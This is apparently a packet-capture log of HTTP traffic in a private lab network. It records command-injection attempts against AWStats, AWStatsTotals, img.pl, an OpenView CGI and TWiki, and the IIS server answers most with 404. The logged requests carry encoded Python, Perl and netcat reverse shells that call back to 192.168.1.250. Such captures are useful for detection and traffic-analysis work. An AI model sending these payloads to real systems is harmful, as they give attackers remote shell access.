+[0m[1m[32m	User-Agent:[0m[1m Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n
+[0m[1m[32m	Connection:[0m[1m Close\r\n
+[0m[1m[32m	Full request URI […]:[0m[1m http://192.168.1.12/cgi-bin/awstats.pl?configdir=|echo;echo%20YYY;python%20-c%20%22exec%28%27aW1wb3J0IHNvY2tldCAgICAgICAgICwgICAgICAgc3VicHJvY2VzcyAgICAgICAgICwgICAgICAgb3MgOyAgICAgIGhvc3Q9IjE5Mi4xNjguMS4yNTAiIDsgIC
+[0m[1m	\r\n
+[0m[1m[32m	Request URI Query Parameter:[0m[1m echo%20YYY
+[0m[1m[32m	Request URI Query Parameter […]:[0m[1m python%20-c%20%22exec%28%27aW1wb3J0IHNvY2tldCAgICAgICAgICwgICAgICAgc3VicHJvY2VzcyAgICAgICAgICwgICAgICAgb3MgOyAgICAgIGhvc3Q9IjE5Mi4xNjguMS4yNTAiIDsgICAgICBwb3J0PTMwOTI4IDsgICAgICBzPXNvY2tldC5zb2NrZXQoc29ja
+[0m[1m[32m	Request URI Query Parameter:[0m[1m echo%20YYY
+[0m[1m[32m	Request URI Query Parameter:[0m[1m echo|
+[0m
+--------------------------------------------------
+Packet: [1m[33mLayer HTTP
+:[0m[1m	HTTP/1.1 404 Not Found\r\n
+[0m[1m[32m	Response Version:[0m[1m HTTP/1.1
+[0m[1m[32m	Status Code:[0m[1m 404
+[0m[1m[32m	Status Code Description:[0m[1m Not Found
+[0m[1m[32m	Response Phrase:[0m[1m Not Found
+[0m[1m[32m	Content-Type:[0m[1m text/html\r\n
+[0m[1m[32m	Server:[0m[1m Microsoft-IIS/7.5\r\n
+[0m[1m[32m	Date:[0m[1m Tue, 07 Apr 2020 21:13:08 GMT\r\n
+[0m[1m[32m	Connection:[0m[1m close\r\n
+[0m[1m[32m	Content-Length:[0m[1m 1245\r\n
+[0m[1m[32m	Content length:[0m[1m 1245
+[0m[1m[32m	Request in frame:[0m[1m 20912
+[0m[1m[32m	Time since request:[0m[1m 0.001353000 seconds
+[0m[1m[32m	Request URI […]:[0m[1m /cgi-bin/awstats.pl?configdir=|echo;echo%20YYY;python%20-c%20%22exec%28%27aW1wb3J0IHNvY2tldCAgICAgICAgICwgICAgICAgc3VicHJvY2VzcyAgICAgICAgICwgICAgICAgb3MgOyAgICAgIGhvc3Q9IjE5Mi4xNjguMS4yNTAiIDsgICAgICBwb3J0PTMwOTI4IDsgIC
+[0m[1m[32m	Full request URI […]:[0m[1m http://192.168.1.12/cgi-bin/awstats.pl?configdir=|echo;echo%20YYY;python%20-c%20%22exec%28%27aW1wb3J0IHNvY2tldCAgICAgICAgICwgICAgICAgc3VicHJvY2VzcyAgICAgICAgICwgICAgICAgb3MgOyAgICAgIGhvc3Q9IjE5Mi4xNjguMS4yNTAiIDsgIC
+[0m[1m[32m	File Data:[0m[1m 1245 bytes
+[0m[1m	\r\n
+[0m
+--------------------------------------------------
+Packet: [1m[33mLayer HTTP
+:[0m[1m	 […]GET /cgi-bin/awstats.pl?migrate=|echo;echo%20YYY;cd%20/tmp%20%26%26python%20-c%20%22exec%28%27aW1wb3J0IHNvY2tldCAgICAsICAgICAgICAgc3VicHJvY2VzcyAgICAsICAgICAgICAgb3MgICA7ICAgICBob3N0PSIxOTIuMTY4LjEuMjUwIiAgIDsgICAgIHBvcnQ9MzA5MzQgICA
+[0m[1m[32m	Request Method:[0m[1m GET
+[0m[1m[32m	Request URI […]:[0m[1m /cgi-bin/awstats.pl?migrate=|echo;echo%20YYY;cd%20/tmp%20%26%26python%20-c%20%22exec%28%27aW1wb3J0IHNvY2tldCAgICAsICAgICAgICAgc3VicHJvY2VzcyAgICAsICAgICAgICAgb3MgICA7ICAgICBob3N0PSIxOTIuMTY4LjEuMjUwIiAgIDsgICAgIHBvcnQ9Mz
+[0m[1m[32m	Request URI Path:[0m[1m /cgi-bin/awstats.pl
+[0m[1m[32m	Request URI Query […]:[0m[1m migrate=|echo;echo%20YYY;cd%20/tmp%20%26%26python%20-c%20%22exec%28%27aW1wb3J0IHNvY2tldCAgICAsICAgICAgICAgc3VicHJvY2VzcyAgICAsICAgICAgICAgb3MgICA7ICAgICBob3N0PSIxOTIuMTY4LjEuMjUwIiAgIDsgICAgIHBvcnQ9MzA5MzQgICA7ICAg
+[0m[1m[32m	Request URI Query Parameter:[0m[1m migrate=|echo
+[0m[1m[32m	Request Version:[0m[1m HTTP/1.1
+[0m[1m[32m	Host:[0m[1m 192.168.1.12\r\n
+[0m[1m[32m	User-Agent:[0m[1m Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n
+[0m[1m[32m	Connection:[0m[1m Close\r\n
+[0m[1m[32m	Full request URI […]:[0m[1m http://192.168.1.12/cgi-bin/awstats.pl?migrate=|echo;echo%20YYY;cd%20/tmp%20%26%26python%20-c%20%22exec%28%27aW1wb3J0IHNvY2tldCAgICAsICAgICAgICAgc3VicHJvY2VzcyAgICAsICAgICAgICAgb3MgICA7ICAgICBob3N0PSIxOTIuMTY4LjEuMj
+[0m[1m	\r\n
+[0m[1m[32m	Request URI Query Parameter:[0m[1m echo%20YYY
+[0m[1m[32m	Request URI Query Parameter […]:[0m[1m cd%20/tmp%20%26%26python%20-c%20%22exec%28%27aW1wb3J0IHNvY2tldCAgICAsICAgICAgICAgc3VicHJvY2VzcyAgICAsICAgICAgICAgb3MgICA7ICAgICBob3N0PSIxOTIuMTY4LjEuMjUwIiAgIDsgICAgIHBvcnQ9MzA5MzQgICA7ICAgICBzPXNvY2tldC5
+[0m[1m[32m	Request URI Query Parameter:[0m[1m echo%20YYY
+[0m[1m[32m	Request URI Query Parameter:[0m[1m echo|awstats169017.demo.txt
+[0m
+--------------------------------------------------
+Packet: [1m[33mLayer HTTP
+:[0m[1m	HTTP/1.1 404 Not Found\r\n
+[0m[1m[32m	Response Version:[0m[1m HTTP/1.1
+[0m[1m[32m	Status Code:[0m[1m 404
+[0m[1m[32m	Status Code Description:[0m[1m Not Found
+[0m[1m[32m	Response Phrase:[0m[1m Not Found
+[0m[1m[32m	Content-Type:[0m[1m text/html\r\n
+[0m[1m[32m	Server:[0m[1m Microsoft-IIS/7.5\r\n
+[0m[1m[32m	Date:[0m[1m Tue, 07 Apr 2020 21:13:10 GMT\r\n
+[0m[1m[32m	Connection:[0m[1m close\r\n
+[0m[1m[32m	Content-Length:[0m[1m 1245\r\n
+[0m[1m[32m	Content length:[0m[1m 1245
+[0m[1m[32m	Request in frame:[0m[1m 20923
+[0m[1m[32m	Time since request:[0m[1m 0.001369000 seconds
+[0m[1m[32m	Request URI […]:[0m[1m /cgi-bin/awstats.pl?migrate=|echo;echo%20YYY;cd%20/tmp%20%26%26python%20-c%20%22exec%28%27aW1wb3J0IHNvY2tldCAgICAsICAgICAgICAgc3VicHJvY2VzcyAgICAsICAgICAgICAgb3MgICA7ICAgICBob3N0PSIxOTIuMTY4LjEuMjUwIiAgIDsgICAgIHBvcnQ9Mz
+[0m[1m[32m	Full request URI […]:[0m[1m http://192.168.1.12/cgi-bin/awstats.pl?migrate=|echo;echo%20YYY;cd%20/tmp%20%26%26python%20-c%20%22exec%28%27aW1wb3J0IHNvY2tldCAgICAsICAgICAgICAgc3VicHJvY2VzcyAgICAsICAgICAgICAgb3MgICA7ICAgICBob3N0PSIxOTIuMTY4LjEuMj
+[0m[1m[32m	File Data:[0m[1m 1245 bytes
+[0m[1m	\r\n
+[0m
+--------------------------------------------------
+Packet: [1m[33mLayer HTTP
+:[0m[1m	 […]GET /awstatstotals/awstatstotals.php?sort="].passthru('echo%20YYY;python%20-c%20%22exec%28%27aW1wb3J0IHNvY2tldCwgICAgICAgc3VicHJvY2VzcywgICAgICAgb3MgOyAgICAgICAgaG9zdD0iMTkyLjE2OC4xLjI1MCIgOyAgICAgICAgcG9ydD0zMDk0MCA7ICAgICAgICBzPXNv
+[0m[1m[32m	Request Method:[0m[1m GET
+[0m[1m[32m	Request URI […]:[0m[1m /awstatstotals/awstatstotals.php?sort="].passthru('echo%20YYY;python%20-c%20%22exec%28%27aW1wb3J0IHNvY2tldCwgICAgICAgc3VicHJvY2VzcywgICAgICAgb3MgOyAgICAgICAgaG9zdD0iMTkyLjE2OC4xLjI1MCIgOyAgICAgICAgcG9ydD0zMDk0MCA7ICAgICA
+[0m[1m[32m	Request URI Path:[0m[1m /awstatstotals/awstatstotals.php
+[0m[1m[32m	Request URI Query […]:[0m[1m sort="].passthru('echo%20YYY;python%20-c%20%22exec%28%27aW1wb3J0IHNvY2tldCwgICAgICAgc3VicHJvY2VzcywgICAgICAgb3MgOyAgICAgICAgaG9zdD0iMTkyLjE2OC4xLjI1MCIgOyAgICAgICAgcG9ydD0zMDk0MCA7ICAgICAgICBzPXNvY2tldC5zb2NrZXQoc2
+[0m[1m[32m	Request URI Query Parameter:[0m[1m sort="].passthru
+[0m[1m[32m	Request Version:[0m[1m HTTP/1.1
+[0m[1m[32m	Host:[0m[1m 192.168.1.12\r\n
+[0m[1m[32m	User-Agent:[0m[1m Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n
+[0m[1m[32m	Connection:[0m[1m Close\r\n
+[0m[1m[32m	Full request URI […]:[0m[1m http://192.168.1.12/awstatstotals/awstatstotals.php?sort="].passthru('echo%20YYY;python%20-c%20%22exec%28%27aW1wb3J0IHNvY2tldCwgICAgICAgc3VicHJvY2VzcywgICAgICAgb3MgOyAgICAgICAgaG9zdD0iMTkyLjE2OC4xLjI1MCIgOyAgICAgICA
+[0m[1m	\r\n
+[0m[1m[32m	Request URI Query Parameter:[0m[1m 'echo%20YYY
+[0m[1m[32m	Request URI Query Parameter […]:[0m[1m python%20-c%20%22exec%28%27aW1wb3J0IHNvY2tldCwgICAgICAgc3VicHJvY2VzcywgICAgICAgb3MgOyAgICAgICAgaG9zdD0iMTkyLjE2OC4xLjI1MCIgOyAgICAgICAgcG9ydD0zMDk0MCA7ICAgICAgICBzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsI
+[0m[1m[32m	Request URI Query Parameter:[0m[1m echo%20YYY
+[0m[1m[32m	Request URI Query Parameter:[0m[1m '
+[0m[1m[32m	Request URI Query Parameter:[0m[1m .exit
+[0m[1m[32m	Request URI Query Parameter:[0m[1m ).%24a["
+[0m
+--------------------------------------------------
+Packet: [1m[33mLayer HTTP
+:[0m[1m	HTTP/1.1 404 Not Found\r\n
+[0m[1m[32m	Response Version:[0m[1m HTTP/1.1
+[0m[1m[32m	Status Code:[0m[1m 404
+[0m[1m[32m	Status Code Description:[0m[1m Not Found
+[0m[1m[32m	Response Phrase:[0m[1m Not Found
+[0m[1m[32m	Content-Type:[0m[1m text/html\r\n
+[0m[1m[32m	Server:[0m[1m Microsoft-IIS/7.5\r\n
+[0m[1m[32m	Date:[0m[1m Tue, 07 Apr 2020 21:13:12 GMT\r\n
+[0m[1m[32m	Connection:[0m[1m close\r\n
+[0m[1m[32m	Content-Length:[0m[1m 1245\r\n
+[0m[1m[32m	Content length:[0m[1m 1245
+[0m[1m[32m	Request in frame:[0m[1m 20939
+[0m[1m[32m	Time since request:[0m[1m 0.001377000 seconds
+[0m[1m[32m	Request URI […]:[0m[1m /awstatstotals/awstatstotals.php?sort="].passthru('echo%20YYY;python%20-c%20%22exec%28%27aW1wb3J0IHNvY2tldCwgICAgICAgc3VicHJvY2VzcywgICAgICAgb3MgOyAgICAgICAgaG9zdD0iMTkyLjE2OC4xLjI1MCIgOyAgICAgICAgcG9ydD0zMDk0MCA7ICAgICA
+[0m[1m[32m	Full request URI […]:[0m[1m http://192.168.1.12/awstatstotals/awstatstotals.php?sort="].passthru('echo%20YYY;python%20-c%20%22exec%28%27aW1wb3J0IHNvY2tldCwgICAgICAgc3VicHJvY2VzcywgICAgICAgb3MgOyAgICAgICAgaG9zdD0iMTkyLjE2OC4xLjI1MCIgOyAgICAgICA
+[0m[1m[32m	File Data:[0m[1m 1245 bytes
+[0m[1m	\r\n
+[0m
+--------------------------------------------------
+Packet: [1m[33mLayer HTTP
+:[0m[1m	 […]GET /cgi-bin/img.pl?f=../../../../../../../../bin/sh%20-c%20%22echo%20%27YYY%27%3b%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3bforeach%20my%20%24key%28keys%20%25ENV%29%7bif%28%24ENV%7b%24key%7d%3d~/%28.%2a%29/%29%7b%2
+[0m[1m[32m	Request Method:[0m[1m GET
+[0m[1m[32m	Request URI […]:[0m[1m /cgi-bin/img.pl?f=../../../../../../../../bin/sh%20-c%20%22echo%20%27YYY%27%3b%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3bforeach%20my%20%24key%28keys%20%25ENV%29%7bif%28%24ENV%7b%24key%7d%3d~/%28.%2a%29
+[0m[1m[32m	Request URI Path:[0m[1m /cgi-bin/img.pl
+[0m[1m[32m	Request URI Query […]:[0m[1m f=../../../../../../../../bin/sh%20-c%20%22echo%20%27YYY%27%3b%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3bforeach%20my%20%24key%28keys%20%25ENV%29%7bif%28%24ENV%7b%24key%7d%3d~/%28.%2a%29/%29%7b%24
+[0m[1m[32m	Request URI Query Parameter […]:[0m[1m f=../../../../../../../../bin/sh%20-c%20%22echo%20%27YYY%27%3b%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3bforeach%20my%20%24key%28keys%20%25ENV%29%7bif%28%24ENV%7b%24key%7d%3d~/%28.%2a%29
+[0m[1m[32m	Request Version:[0m[1m HTTP/1.1
+[0m[1m[32m	Host:[0m[1m 192.168.1.12\r\n
+[0m[1m[32m	User-Agent:[0m[1m Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n
+[0m[1m[32m	Content-Type:[0m[1m application/x-www-form-urlencoded\r\n
+[0m[1m[32m	Full request URI […]:[0m[1m http://192.168.1.12/cgi-bin/img.pl?f=../../../../../../../../bin/sh%20-c%20%22echo%20%27YYY%27%3b%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3bforeach%20my%20%24key%28keys%20%25ENV%29%7bif%28%24ENV%7b
+[0m[1m	\r\n
+[0m
+--------------------------------------------------
+Packet: [1m[33mLayer HTTP
+:[0m[1m	HTTP/1.1 404 Not Found\r\n
+[0m[1m[32m	Response Version:[0m[1m HTTP/1.1
+[0m[1m[32m	Status Code:[0m[1m 404
+[0m[1m[32m	Status Code Description:[0m[1m Not Found
+[0m[1m[32m	Response Phrase:[0m[1m Not Found
+[0m[1m[32m	Content-Type:[0m[1m text/html\r\n
+[0m[1m[32m	Server:[0m[1m Microsoft-IIS/7.5\r\n
+[0m[1m[32m	Date:[0m[1m Tue, 07 Apr 2020 21:13:14 GMT\r\n
+[0m[1m[32m	Content-Length:[0m[1m 1245\r\n
+[0m[1m[32m	Content length:[0m[1m 1245
+[0m[1m[32m	Request in frame:[0m[1m 20957
+[0m[1m[32m	Time since request:[0m[1m 0.001311000 seconds
+[0m[1m[32m	Request URI […]:[0m[1m /cgi-bin/img.pl?f=../../../../../../../../bin/sh%20-c%20%22echo%20%27YYY%27%3b%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3bforeach%20my%20%24key%28keys%20%25ENV%29%7bif%28%24ENV%7b%24key%7d%3d~/%28.%2a%29
+[0m[1m[32m	Full request URI […]:[0m[1m http://192.168.1.12/cgi-bin/img.pl?f=../../../../../../../../bin/sh%20-c%20%22echo%20%27YYY%27%3b%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3bforeach%20my%20%24key%28keys%20%25ENV%29%7bif%28%24ENV%7b
+[0m[1m[32m	File Data:[0m[1m 1245 bytes
+[0m[1m	\r\n
+[0m
+--------------------------------------------------
+Packet: [1m[33mLayer HTTP
+:[0m[1m	 […]GET /OvCgi/connectedNodes.ovpl?node=%3b%20echo%20YYY%3b%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3bforeach%20my%20%24key%28keys%20%25ENV%29%7bif%28%24ENV%7b%24key%7d%3d~/%28.%2a%29/%29%7b%24ENV%7b%24key%7d%3d%241%3b%
+[0m[1m[32m	Request Method:[0m[1m GET
+[0m[1m[32m	Request URI […]:[0m[1m /OvCgi/connectedNodes.ovpl?node=%3b%20echo%20YYY%3b%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3bforeach%20my%20%24key%28keys%20%25ENV%29%7bif%28%24ENV%7b%24key%7d%3d~/%28.%2a%29/%29%7b%24ENV%7b%24key%7d%3
+[0m[1m[32m	Request URI Path:[0m[1m /OvCgi/connectedNodes.ovpl
+[0m[1m[32m	Request URI Query […]:[0m[1m node=%3b%20echo%20YYY%3b%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3bforeach%20my%20%24key%28keys%20%25ENV%29%7bif%28%24ENV%7b%24key%7d%3d~/%28.%2a%29/%29%7b%24ENV%7b%24key%7d%3d%241%3b%7d%7d%24c%3d
+[0m[1m[32m	Request URI Query Parameter […]:[0m[1m node=%3b%20echo%20YYY%3b%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3bforeach%20my%20%24key%28keys%20%25ENV%29%7bif%28%24ENV%7b%24key%7d%3d~/%28.%2a%29/%29%7b%24ENV%7b%24key%7d%3d%241%3b%7d
+[0m[1m[32m	Request Version:[0m[1m HTTP/1.1
+[0m[1m[32m	Host:[0m[1m 192.168.1.12\r\n
+[0m[1m[32m	User-Agent:[0m[1m Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n
+[0m[1m[32m	Content-Type:[0m[1m application/x-www-form-urlencoded\r\n
+[0m[1m[32m	Full request URI […]:[0m[1m http://192.168.1.12/OvCgi/connectedNodes.ovpl?node=%3b%20echo%20YYY%3b%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3bforeach%20my%20%24key%28keys%20%25ENV%29%7bif%28%24ENV%7b%24key%7d%3d~/%28.%2a%29/%2
+[0m[1m	\r\n
+[0m
+--------------------------------------------------
+Packet: [1m[33mLayer HTTP
+:[0m[1m	HTTP/1.1 404 Not Found\r\n
+[0m[1m[32m	Response Version:[0m[1m HTTP/1.1
+[0m[1m[32m	Status Code:[0m[1m 404
+[0m[1m[32m	Status Code Description:[0m[1m Not Found
+[0m[1m[32m	Response Phrase:[0m[1m Not Found
+[0m[1m[32m	Content-Type:[0m[1m text/html\r\n
+[0m[1m[32m	Server:[0m[1m Microsoft-IIS/7.5\r\n
+[0m[1m[32m	Date:[0m[1m Tue, 07 Apr 2020 21:14:35 GMT\r\n
+[0m[1m[32m	Content-Length:[0m[1m 1245\r\n
+[0m[1m[32m	Content length:[0m[1m 1245
+[0m[1m[32m	Request in frame:[0m[1m 22088
+[0m[1m[32m	Time since request:[0m[1m 0.001295000 seconds
+[0m[1m[32m	Request URI […]:[0m[1m /OvCgi/connectedNodes.ovpl?node=%3b%20echo%20YYY%3b%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3bforeach%20my%20%24key%28keys%20%25ENV%29%7bif%28%24ENV%7b%24key%7d%3d~/%28.%2a%29/%29%7b%24ENV%7b%24key%7d%3
+[0m[1m[32m	Full request URI […]:[0m[1m http://192.168.1.12/OvCgi/connectedNodes.ovpl?node=%3b%20echo%20YYY%3b%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3bforeach%20my%20%24key%28keys%20%25ENV%29%7bif%28%24ENV%7b%24key%7d%3d~/%28.%2a%29/%2
+[0m[1m[32m	File Data:[0m[1m 1245 bytes
+[0m[1m	\r\n
+[0m
+--------------------------------------------------
+Packet: [1m[33mLayer HTTP
+:[0m[1m	 […]GET /twiki/bin/view/Main/WebSearch?search=lpyIZrD%27%3b/bin/echo%24%7bIFS%7d-ne%24%7bIFS%7d%27\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x6a\x64\x61\x6f\x71\x66\x62\x3b\x20\x6e\x63\x20\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e\x3
+[0m[1m[32m	Request Method:[0m[1m GET
+[0m[1m[32m	Request URI […]:[0m[1m /twiki/bin/view/Main/WebSearch?search=lpyIZrD%27%3b/bin/echo%24%7bIFS%7d-ne%24%7bIFS%7d%27\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x6a\x64\x61\x6f\x71\x66\x62\x3b\x20\x6e\x63\x20\x31\x39\x32\x2e\x31\x36\x38\x2e\x
+[0m[1m[32m	Request URI Path:[0m[1m /twiki/bin/view/Main/WebSearch
+[0m[1m[32m	Request URI Query […]:[0m[1m search=lpyIZrD%27%3b/bin/echo%24%7bIFS%7d-ne%24%7bIFS%7d%27\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x6a\x64\x61\x6f\x71\x66\x62\x3b\x20\x6e\x63\x20\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e\x32\x35\x30\x20\x3
+[0m[1m[32m	Request URI Query Parameter […]:[0m[1m search=lpyIZrD%27%3b/bin/echo%24%7bIFS%7d-ne%24%7bIFS%7d%27\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x6a\x64\x61\x6f\x71\x66\x62\x3b\x20\x6e\x63\x20\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e\x32\x35\
+[0m[1m[32m	Request Version:[0m[1m HTTP/1.1
+[0m[1m[32m	Host:[0m[1m 192.168.1.12\r\n
+[0m[1m[32m	User-Agent:[0m[1m Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n
+[0m[1m[32m	Content-Type:[0m[1m application/x-www-form-urlencoded\r\n
+[0m[1m[32m	Full request URI […]:[0m[1m http://192.168.1.12/twiki/bin/view/Main/WebSearch?search=lpyIZrD%27%3b/bin/echo%24%7bIFS%7d-ne%24%7bIFS%7d%27\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x6a\x64\x61\x6f\x71\x66\x62\x3b\x20\x6e\x63\x20\x31\x39\x
+[0m[1m	\r\n
+[0m
+--------------------------------------------------
+Packet: [1m[33mLayer HTTP
+:[0m[1m	HTTP/1.1 404 Not Found\r\n
+[0m[1m[32m	Response Version:[0m[1m HTTP/1.1
+[0m[1m[32m	Status Code:[0m[1m 404
+[0m[1m[32m	Status Code Description:[0m[1m Not Found
+[0m[1m[32m	Response Phrase:[0m[1m Not Found
+[0m[1m[32m	Content-Type:[0m[1m text/html\r\n
+[0m[1m[32m	Server:[0m[1m Microsoft-IIS/7.5\r\n
+[0m[1m[32m	Date:[0m[1m Tue, 07 Apr 2020 21:15:17 GMT\r\n
+[0m[1m[32m	Content-Length:[0m[1m 1245\r\n
+[0m[1m[32m	Content length:[0m[1m 1245
+[0m[1m[32m	Request in frame:[0m[1m 22843
+[0m[1m[32m	Time since request:[0m[1m 0.001037000 seconds
+[0m[1m[32m	Request URI […]:[0m[1m /twiki/bin/view/Main/WebSearch?search=lpyIZrD%27%3b/bin/echo%24%7bIFS%7d-ne%24%7bIFS%7d%27\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x6a\x64\x61\x6f\x71\x66\x62\x3b\x20\x6e\x63\x20\x31\x39\x32\x2e\x31\x36\x38\x2e\x
+[0m[1m[32m	Full request URI […]:[0m[1m http://192.168.1.12/twiki/bin/view/Main/WebSearch?search=lpyIZrD%27%3b/bin/echo%24%7bIFS%7d-ne%24%7bIFS%7d%27\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x6a\x64\x61\x6f\x71\x66\x62\x3b\x20\x6e\x63\x20\x31\x39\x
+[0m[1m[32m	File Data:[0m[1m 1245 bytes
+[0m[1m	\r\n
+[0m
+--------------------------------------------------
+Packet: [1m[33mLayer HTTP
+:[0m[1m	GET /?&echo+VDQgJvJVQN HTTP/1.1\r\n
+[0m[1m[32m	Request Method:[0m[1m GET
+[0m[1m[32m	Request URI:[0m[1m /?&echo+VDQgJvJVQN
+[0m[1m[32m	Request URI Path:[0m[1m /
+[0m[1m[32m	Request URI Query:[0m[1m &echo+VDQgJvJVQN
+[0m[1m[32m	Request URI Query Parameter:[0m[1m &echo
+[0m[1m[32m	Request Version:[0m[1m HTTP/1.1
+[0m[1m[32m	Host:[0m[1m 192.168.1.12\r\n
+[0m[1m[32m	User-Agent:[0m[1m Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n
+[0m[1m[32m	Content-Type:[0m[1m application/x-www-form-urlencoded\r\n
+[0m[1m[32m	Full request URI:[0m[1m http://192.168.1.12/?&echo+VDQgJvJVQN
+[0m[1m	\r\n
+[0m[1m[32m	Request URI Query Parameter:[0m[1m VDQgJvJVQN
+[0m
+--------------------------------------------------
+Packet: [1m[33mLayer HTTP
+:[0m[1m	HTTP/1.1 200 OK\r\n
+[0m[1m[32m	Response Version:[0m[1m HTTP/1.1
+[0m[1m[32m	Status Code:[0m[1m 200
+[0m[1m[32m	Status Code Description:[0m[1m OK
+[0m[1m[32m	Response Phrase:[0m[1m OK
+[0m[1m[32m	Content-Type:[0m[1m text/html\r\n
+[0m[1m[32m	Last-Modified:[0m[1m Thu, 06 Feb 2020 00:09:37 GMT\r\n
+[0m[1m[32m	Server:[0m[1m Microsoft-IIS/7.5\r\n
+[0m[1m[32m	Date:[0m[1m Tue, 07 Apr 2020 21:25:32 GMT\r\n
+[0m[1m[32m	Content-Length:[0m[1m 689\r\n
+[0m[1m[32m	Content length:[0m[1m 689
+[0m[1m[32m	Request in frame:[0m[1m 53027
+[0m[1m[32m	Time since request:[0m[1m 0.001448000 seconds
+[0m[1m[32m	Request URI:[0m[1m /?&echo+VDQgJvJVQN
+[0m[1m[32m	Full request URI:[0m[1m http://192.168.1.12/?&echo+VDQgJvJVQN
+[0m[1m[32m	File Data:[0m[1m 689 bytes
+[0m[1m	\r\n
+[0m[1m[32m	Accept-Ranges:[0m[1m bytes\r\n
+[0m[1m[32m	ETag:[0m[1m "da6263b881dcd51:0"\r\n
+[0m
+--------------------------------------------------
